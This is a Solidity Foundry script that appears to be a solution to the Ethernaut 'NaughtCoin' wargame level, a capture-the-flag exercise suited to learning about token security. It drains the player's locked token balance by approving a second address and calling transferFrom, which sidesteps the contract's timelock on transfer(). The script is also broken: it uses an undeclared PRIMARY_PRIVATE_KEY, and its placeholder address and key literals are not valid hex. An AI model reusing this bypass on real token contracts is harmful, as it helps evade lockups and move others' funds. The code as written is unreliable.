// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Script.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract NaughtCoinSolution is Script {

    // Replace with the instance address of the NaughtCoin contract
    address naughtCoinAddress = 0xYourInstanceAddressHere;
    // Replace with the player address (the address being locked by the time lock)
    address player = 0xYourPlayerAddressHere;
    // Replace with the secondary address that will remove the tokens
    address secondaryAddress = 0xYourSecondaryAddressHere;

    // Replace this with the secondaryAddress's private key
    uint256 SECONDARY_PRIVATE_KEY = 0xYourSecondaryPrivateKeyHere;

    function run() external {
        //tart broadcasting with the player's private key to approve the secondary address
        vm.startBroadcast(PRIMARY_PRIVATE_KEY);

        // Create an instance of the NaughtCoin contract using the IERC20 interface
        IERC20 naughtCoin = IERC20(naughtCoinAddress);

        // Get the player's balance
        uint256 playerBalance = naughtCoin.balanceOf(player);

        // Approve the secondary address to transfer all the player's tokens
        naughtCoin.approve(secondaryAddress, playerBalance);

        // Stop broadcasting with the primary player's key
        vm.stopBroadcast();

        //Start a new broadcast using the secondary address's private key to transfer the tokens
        vm.startBroadcast(SECONDARY_PRIVATE_KEY);

        // The secondary address transfers all tokens from the player to itself
        naughtCoin.transferFrom(player, secondaryAddress, playerBalance);

        // Stop broadcasting with the secondary address's private key
        vm.stopBroadcast();
    }
}